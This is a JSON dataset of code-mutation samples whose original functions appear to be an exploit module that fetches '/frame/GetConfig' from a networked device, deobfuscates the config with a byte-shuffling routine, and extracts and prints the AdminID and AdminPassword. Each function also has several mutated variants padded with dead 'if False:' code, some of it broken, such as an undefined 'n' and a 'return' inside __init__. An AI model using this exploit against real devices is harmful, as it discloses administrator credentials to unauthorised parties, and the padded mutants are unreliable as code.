[
    {
        "func_name": "__init__",
        "original": "def __init__(self):\n    self.config_content = None",
        "mutated": [
            "def __init__(self):\n    if False:\n        i = 10\n    self.config_content = None",
            "def __init__(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    self.config_content = None",
            "def __init__(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    self.config_content = None",
            "def __init__(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    self.config_content = None",
            "def __init__(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    self.config_content = None"
        ]
    },
    {
        "func_name": "run",
        "original": "def run(self):\n    if self.check():\n        print_success('Target appears to be vulnerable.')\n        admin_id = None\n        admin_password = None\n        if self.config_content and len(self.config_content):\n            for line in self.config_content.split('\\n'):\n                line = line.strip()\n                m_groups = re.match('AdminID=(.*)', line, re.I | re.M)\n                if m_groups:\n                    print_success('Found Admin ID.')\n                    admin_id = m_groups.group(1)\n                m_groups = re.match('AdminPassword=(.*)', line, re.I | re.M)\n                if m_groups:\n                    print_success('Found Admin password.')\n                    admin_password = m_groups.group(1)\n                    break\n            print_table(('AdminId', 'Password'), (admin_id, admin_password))\n    else:\n        print_error('Exploit failed - target seems to be not vulnerable')",
        "mutated": [
            "def run(self):\n    if False:\n        i = 10\n    if self.check():\n        print_success('Target appears to be vulnerable.')\n        admin_id = None\n        admin_password = None\n        if self.config_content and len(self.config_content):\n            for line in self.config_content.split('\\n'):\n                line = line.strip()\n                m_groups = re.match('AdminID=(.*)', line, re.I | re.M)\n                if m_groups:\n                    print_success('Found Admin ID.')\n                    admin_id = m_groups.group(1)\n                m_groups = re.match('AdminPassword=(.*)', line, re.I | re.M)\n                if m_groups:\n                    print_success('Found Admin password.')\n                    admin_password = m_groups.group(1)\n                    break\n            print_table(('AdminId', 'Password'), (admin_id, admin_password))\n    else:\n        print_error('Exploit failed - target seems to be not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if self.check():\n        print_success('Target appears to be vulnerable.')\n        admin_id = None\n        admin_password = None\n        if self.config_content and len(self.config_content):\n            for line in self.config_content.split('\\n'):\n                line = line.strip()\n                m_groups = re.match('AdminID=(.*)', line, re.I | re.M)\n                if m_groups:\n                    print_success('Found Admin ID.')\n                    admin_id = m_groups.group(1)\n                m_groups = re.match('AdminPassword=(.*)', line, re.I | re.M)\n                if m_groups:\n                    print_success('Found Admin password.')\n                    admin_password = m_groups.group(1)\n                    break\n            print_table(('AdminId', 'Password'), (admin_id, admin_password))\n    else:\n        print_error('Exploit failed - target seems to be not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if self.check():\n        print_success('Target appears to be vulnerable.')\n        admin_id = None\n        admin_password = None\n        if self.config_content and len(self.config_content):\n            for line in self.config_content.split('\\n'):\n                line = line.strip()\n                m_groups = re.match('AdminID=(.*)', line, re.I | re.M)\n                if m_groups:\n                    print_success('Found Admin ID.')\n                    admin_id = m_groups.group(1)\n                m_groups = re.match('AdminPassword=(.*)', line, re.I | re.M)\n                if m_groups:\n                    print_success('Found Admin password.')\n                    admin_password = m_groups.group(1)\n                    break\n            print_table(('AdminId', 'Password'), (admin_id, admin_password))\n    else:\n        print_error('Exploit failed - target seems to be not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if self.check():\n        print_success('Target appears to be vulnerable.')\n        admin_id = None\n        admin_password = None\n        if self.config_content and len(self.config_content):\n            for line in self.config_content.split('\\n'):\n                line = line.strip()\n                m_groups = re.match('AdminID=(.*)', line, re.I | re.M)\n                if m_groups:\n                    print_success('Found Admin ID.')\n                    admin_id = m_groups.group(1)\n                m_groups = re.match('AdminPassword=(.*)', line, re.I | re.M)\n                if m_groups:\n                    print_success('Found Admin password.')\n                    admin_password = m_groups.group(1)\n                    break\n            print_table(('AdminId', 'Password'), (admin_id, admin_password))\n    else:\n        print_error('Exploit failed - target seems to be not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if self.check():\n        print_success('Target appears to be vulnerable.')\n        admin_id = None\n        admin_password = None\n        if self.config_content and len(self.config_content):\n            for line in self.config_content.split('\\n'):\n                line = line.strip()\n                m_groups = re.match('AdminID=(.*)', line, re.I | re.M)\n                if m_groups:\n                    print_success('Found Admin ID.')\n                    admin_id = m_groups.group(1)\n                m_groups = re.match('AdminPassword=(.*)', line, re.I | re.M)\n                if m_groups:\n                    print_success('Found Admin password.')\n                    admin_password = m_groups.group(1)\n                    break\n            print_table(('AdminId', 'Password'), (admin_id, admin_password))\n    else:\n        print_error('Exploit failed - target seems to be not vulnerable')"
        ]
    },
    {
        "func_name": "check",
        "original": "@mute\ndef check(self):\n    response = self.http_request(method='GET', path='/frame/GetConfig')\n    if response and response.status_code == 200 and len(response.content):\n        self.config_content = self._deobfuscate(response.content)\n        if self.config_content and any([x in self.config_content for x in ['AdminID=', 'AdminPassword=']]):\n            return True\n    return False",
        "mutated": [
            "@mute\ndef check(self):\n    if False:\n        i = 10\n    response = self.http_request(method='GET', path='/frame/GetConfig')\n    if response and response.status_code == 200 and len(response.content):\n        self.config_content = self._deobfuscate(response.content)\n        if self.config_content and any([x in self.config_content for x in ['AdminID=', 'AdminPassword=']]):\n            return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    response = self.http_request(method='GET', path='/frame/GetConfig')\n    if response and response.status_code == 200 and len(response.content):\n        self.config_content = self._deobfuscate(response.content)\n        if self.config_content and any([x in self.config_content for x in ['AdminID=', 'AdminPassword=']]):\n            return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    response = self.http_request(method='GET', path='/frame/GetConfig')\n    if response and response.status_code == 200 and len(response.content):\n        self.config_content = self._deobfuscate(response.content)\n        if self.config_content and any([x in self.config_content for x in ['AdminID=', 'AdminPassword=']]):\n            return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    response = self.http_request(method='GET', path='/frame/GetConfig')\n    if response and response.status_code == 200 and len(response.content):\n        self.config_content = self._deobfuscate(response.content)\n        if self.config_content and any([x in self.config_content for x in ['AdminID=', 'AdminPassword=']]):\n            return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    response = self.http_request(method='GET', path='/frame/GetConfig')\n    if response and response.status_code == 200 and len(response.content):\n        self.config_content = self._deobfuscate(response.content)\n        if self.config_content and any([x in self.config_content for x in ['AdminID=', 'AdminPassword=']]):\n            return True\n    return False"
        ]
    },
    {
        "func_name": "chain",
        "original": "def chain(lambdas, value):\n    r_chain = None\n    for lambda_function in lambdas:\n        r_chain = value = lambda_function(value)\n    return r_chain",
        "mutated": [
            "def chain(lambdas, value):\n    if False:\n        i = 10\n    r_chain = None\n    for lambda_function in lambdas:\n        r_chain = value = lambda_function(value)\n    return r_chain",
            "def chain(lambdas, value):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    r_chain = None\n    for lambda_function in lambdas:\n        r_chain = value = lambda_function(value)\n    return r_chain",
            "def chain(lambdas, value):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    r_chain = None\n    for lambda_function in lambdas:\n        r_chain = value = lambda_function(value)\n    return r_chain",
            "def chain(lambdas, value):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    r_chain = None\n    for lambda_function in lambdas:\n        r_chain = value = lambda_function(value)\n    return r_chain",
            "def chain(lambdas, value):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    r_chain = None\n    for lambda_function in lambdas:\n        r_chain = value = lambda_function(value)\n    return r_chain"
        ]
    },
    {
        "func_name": "_deobfuscate",
        "original": "def _deobfuscate(self, config):\n\n    def chain(lambdas, value):\n        r_chain = None\n        for lambda_function in lambdas:\n            r_chain = value = lambda_function(value)\n        return r_chain\n    arr_c = [chain([lambda d: d + ord('y') & 255, lambda d: (d ^ ord('Z')) & 255, lambda d: d - ord('e') & 255], t) for t in config]\n    arr_c_len = len(arr_c)\n    tmp = (arr_c[arr_c_len - 1] & 7) << 5 & 255\n    for t in reversed(range(arr_c_len)):\n        if t == 0:\n            ct = chain([lambda d: d >> 3 & 255, lambda d: d + tmp & 255], arr_c[t])\n        else:\n            ct = (arr_c[t] >> 3 & 255) + ((arr_c[t - 1] & 7) << 5 & 255) & 255\n        arr_c[t] = ct\n    tmp_str = ''.join(map(chr, arr_c))\n    ret_str = ''\n    if len(tmp_str) % 2 != 0:\n        print_error(\"Config file can't be deobfuscated.\")\n        return None\n    half_str_len = int(len(tmp_str) / 2)\n    for i in range(half_str_len):\n        ret_str += tmp_str[i + half_str_len] + tmp_str[i]\n    return ret_str",
        "mutated": [
            "def _deobfuscate(self, config):\n    if False:\n        i = 10\n\n    def chain(lambdas, value):\n        r_chain = None\n        for lambda_function in lambdas:\n            r_chain = value = lambda_function(value)\n        return r_chain\n    arr_c = [chain([lambda d: d + ord('y') & 255, lambda d: (d ^ ord('Z')) & 255, lambda d: d - ord('e') & 255], t) for t in config]\n    arr_c_len = len(arr_c)\n    tmp = (arr_c[arr_c_len - 1] & 7) << 5 & 255\n    for t in reversed(range(arr_c_len)):\n        if t == 0:\n            ct = chain([lambda d: d >> 3 & 255, lambda d: d + tmp & 255], arr_c[t])\n        else:\n            ct = (arr_c[t] >> 3 & 255) + ((arr_c[t - 1] & 7) << 5 & 255) & 255\n        arr_c[t] = ct\n    tmp_str = ''.join(map(chr, arr_c))\n    ret_str = ''\n    if len(tmp_str) % 2 != 0:\n        print_error(\"Config file can't be deobfuscated.\")\n        return None\n    half_str_len = int(len(tmp_str) / 2)\n    for i in range(half_str_len):\n        ret_str += tmp_str[i + half_str_len] + tmp_str[i]\n    return ret_str",
            "def _deobfuscate(self, config):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n\n    def chain(lambdas, value):\n        r_chain = None\n        for lambda_function in lambdas:\n            r_chain = value = lambda_function(value)\n        return r_chain\n    arr_c = [chain([lambda d: d + ord('y') & 255, lambda d: (d ^ ord('Z')) & 255, lambda d: d - ord('e') & 255], t) for t in config]\n    arr_c_len = len(arr_c)\n    tmp = (arr_c[arr_c_len - 1] & 7) << 5 & 255\n    for t in reversed(range(arr_c_len)):\n        if t == 0:\n            ct = chain([lambda d: d >> 3 & 255, lambda d: d + tmp & 255], arr_c[t])\n        else:\n            ct = (arr_c[t] >> 3 & 255) + ((arr_c[t - 1] & 7) << 5 & 255) & 255\n        arr_c[t] = ct\n    tmp_str = ''.join(map(chr, arr_c))\n    ret_str = ''\n    if len(tmp_str) % 2 != 0:\n        print_error(\"Config file can't be deobfuscated.\")\n        return None\n    half_str_len = int(len(tmp_str) / 2)\n    for i in range(half_str_len):\n        ret_str += tmp_str[i + half_str_len] + tmp_str[i]\n    return ret_str",
            "def _deobfuscate(self, config):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n    def chain(lambdas, value):\n        r_chain = None\n        for lambda_function in lambdas:\n            r_chain = value = lambda_function(value)\n        return r_chain\n    arr_c = [chain([lambda d: d + ord('y') & 255, lambda d: (d ^ ord('Z')) & 255, lambda d: d - ord('e') & 255], t) for t in config]\n    arr_c_len = len(arr_c)\n    tmp = (arr_c[arr_c_len - 1] & 7) << 5 & 255\n    for t in reversed(range(arr_c_len)):\n        if t == 0:\n            ct = chain([lambda d: d >> 3 & 255, lambda d: d + tmp & 255], arr_c[t])\n        else:\n            ct = (arr_c[t] >> 3 & 255) + ((arr_c[t - 1] & 7) << 5 & 255) & 255\n        arr_c[t] = ct\n    tmp_str = ''.join(map(chr, arr_c))\n    ret_str = ''\n    if len(tmp_str) % 2 != 0:\n        print_error(\"Config file can't be deobfuscated.\")\n        return None\n    half_str_len = int(len(tmp_str) / 2)\n    for i in range(half_str_len):\n        ret_str += tmp_str[i + half_str_len] + tmp_str[i]\n    return ret_str",
            "def _deobfuscate(self, config):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n\n    def chain(lambdas, value):\n        r_chain = None\n        for lambda_function in lambdas:\n            r_chain = value = lambda_function(value)\n        return r_chain\n    arr_c = [chain([lambda d: d + ord('y') & 255, lambda d: (d ^ ord('Z')) & 255, lambda d: d - ord('e') & 255], t) for t in config]\n    arr_c_len = len(arr_c)\n    tmp = (arr_c[arr_c_len - 1] & 7) << 5 & 255\n    for t in reversed(range(arr_c_len)):\n        if t == 0:\n            ct = chain([lambda d: d >> 3 & 255, lambda d: d + tmp & 255], arr_c[t])\n        else:\n            ct = (arr_c[t] >> 3 & 255) + ((arr_c[t - 1] & 7) << 5 & 255) & 255\n        arr_c[t] = ct\n    tmp_str = ''.join(map(chr, arr_c))\n    ret_str = ''\n    if len(tmp_str) % 2 != 0:\n        print_error(\"Config file can't be deobfuscated.\")\n        return None\n    half_str_len = int(len(tmp_str) / 2)\n    for i in range(half_str_len):\n        ret_str += tmp_str[i + half_str_len] + tmp_str[i]\n    return ret_str",
            "def _deobfuscate(self, config):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n\n    def chain(lambdas, value):\n        r_chain = None\n        for lambda_function in lambdas:\n            r_chain = value = lambda_function(value)\n        return r_chain\n    arr_c = [chain([lambda d: d + ord('y') & 255, lambda d: (d ^ ord('Z')) & 255, lambda d: d - ord('e') & 255], t) for t in config]\n    arr_c_len = len(arr_c)\n    tmp = (arr_c[arr_c_len - 1] & 7) << 5 & 255\n    for t in reversed(range(arr_c_len)):\n        if t == 0:\n            ct = chain([lambda d: d >> 3 & 255, lambda d: d + tmp & 255], arr_c[t])\n        else:\n            ct = (arr_c[t] >> 3 & 255) + ((arr_c[t - 1] & 7) << 5 & 255) & 255\n        arr_c[t] = ct\n    tmp_str = ''.join(map(chr, arr_c))\n    ret_str = ''\n    if len(tmp_str) % 2 != 0:\n        print_error(\"Config file can't be deobfuscated.\")\n        return None\n    half_str_len = int(len(tmp_str) / 2)\n    for i in range(half_str_len):\n        ret_str += tmp_str[i + half_str_len] + tmp_str[i]\n    return ret_str"
        ]
    }
]